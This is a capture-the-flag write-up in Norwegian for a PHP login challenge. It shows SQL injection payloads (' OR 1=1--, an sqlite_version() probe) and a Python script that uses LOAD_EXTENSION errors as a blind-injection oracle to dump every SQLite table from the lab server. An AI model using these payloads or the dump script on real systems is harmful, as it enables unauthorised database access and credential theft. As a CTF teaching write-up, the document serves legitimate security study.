# Taskname
> Author: Mx. Task

## Challenge

## Solution
Noterer eposten fra forsiden for å bruke på login systemet, angir enn `'` som passord får enn php fatal feilmeldinger som inneholder deler av spørringen
```
SELECT * FROM b....
```
Forsøk på typisk auth bypass,
```
' OR 1=1--
```
gir dessverre ikke noe flag, så passordet er kanskje flagget?

Med en del testing vil enn finne at databasen i bruk er SQLite, eksempelvis ved å sende
```
' OR sqlite_version()--
```
som passord. Herfra er det mange veier til mål, eksempelvis å dumpe hele databasen:

```python
import requests
import re
from collections import defaultdict
from string import ascii_letters, digits, punctuation

uri = 'http://ctf.uiactf.no:3005/index.php?page=login.php'
vocab = ascii_letters + 'æøåÆØÅ ' + digits + '@!."#$%&()*+,-/:;<=>?[]^_`{|}~'
def leak(table, column):
    ret = []
    idx = 0
    for idx in range(100):
        tlen = 0
        for tlen in range(1,100):
            inj = f"' OR CASE WHEN ((SELECT length({column}) FROM {table} LIMIT {idx},1)={tlen}) THEN LOAD_EXTENSION(0) ELSE 0 end -- -"
            resp = requests.post(uri, data={'email': 'admin@minkulewebapp.finnesikke', 'passord': inj, 'login':'login'})
            if len(resp.text) == 1149:
                print(tlen)
                break
        else:
            print(f"LEAKED ALL '{column}' FROM '{table}'")
            break
        val = ''
        for l in range(1,tlen+1):
            for v in vocab:
                inj = f"' OR CASE WHEN ((SELECT substr({column},{l},1) FROM {table} LIMIT {idx},1)='{v}') THEN LOAD_EXTENSION(0) ELSE 0 END -- -"
                resp = requests.post(uri, data={'email': 'admin@minkulewebapp.finnesikke', 'passord': inj, 'login':'login'})
                if len(resp.text) == 1149:
                    val += v
                    break
        ret.append(val)
    return ret

table = 'sqlite_master'
column = 'name'
tables = leak(table, column)
print(tables)
table_col = dict()
for table in tables:
    table_col[table] = leak(f"pragma_table_info('{table}')", 'name')
print(table_col)
class Table:
    def __init__(self, name, columns):
        self.name = name
        self.columns = columns
        self.colcontent = dict()
    def __str__(self):
        return '\n'.join(*zip(self.colcontent.values()))
tabledumps = []
for table, columns in table_col.items():
    T = Table(table, columns)
    for column in columns:
        T.colcontent[column] = leak(table, column)
    for c,v in T.colcontent.items():
        print(c)
        print(''.join(v))
    tabledumps.append(T)
```


